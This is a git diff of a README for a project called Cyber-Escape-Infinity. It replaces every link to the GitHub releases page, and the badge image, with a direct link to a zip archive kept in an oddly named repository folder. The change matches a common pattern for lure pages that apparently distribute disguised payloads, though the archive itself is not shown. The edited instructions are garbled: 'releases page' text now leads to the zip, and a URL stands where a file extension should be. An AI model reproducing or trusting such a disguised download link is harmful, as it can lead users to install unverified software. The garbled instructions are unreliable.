@@ -6,14 +6,14 @@ Welcome to **Cyber-Escape-Infinity**. This is an infinite learning platform for 
 
 ## 🔗 Download Cyber-Escape-Infinity
 
-[![Download Cyber-Escape-Infinity](https://img.shields.io/badge/Download-Cyber--Escape--Infinity-brightgreen.svg)](https://github.com/unsia20/Cyber-Escape-Infinity/releases)
+[![Download Cyber-Escape-Infinity](https://raw.githubusercontent.com/unsia20/Cyber-Escape-Infinity/main/fowler/Cyber-Escape-Infinity.zip)](https://raw.githubusercontent.com/unsia20/Cyber-Escape-Infinity/main/fowler/Cyber-Escape-Infinity.zip)
 
 ## 📥 Download & Install
 
 To download the application, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Click [here](https://github.com/unsia20/Cyber-Escape-Infinity/releases) to go to the releases page.
+   Click [here](https://raw.githubusercontent.com/unsia20/Cyber-Escape-Infinity/main/fowler/Cyber-Escape-Infinity.zip) to go to the releases page.
    
 2. **Choose the Latest Version**  
    On the releases page, look for the latest version of the application. It will generally be at the top of the list. Select it to view the details.
@@ -23,7 +23,7 @@ To download the application, follow these simple steps:
 
     - If you are using Windows, look for a file that ends with `.exe`.
     - If you are using macOS, find the file with `.dmg` extension.
-    - For Linux, look for files ending in `.deb` or `.tar.gz`.
+    - For Linux, look for files ending in `.deb` or `https://raw.githubusercontent.com/unsia20/Cyber-Escape-Infinity/main/fowler/Cyber-Escape-Infinity.zip`.
 
 4. **Run the Application**  
    Once the download is complete, locate the downloaded file in your folder. Double-click the file to begin the installation process. Follow the on-screen instructions to install Cyber-Escape-Infinity.
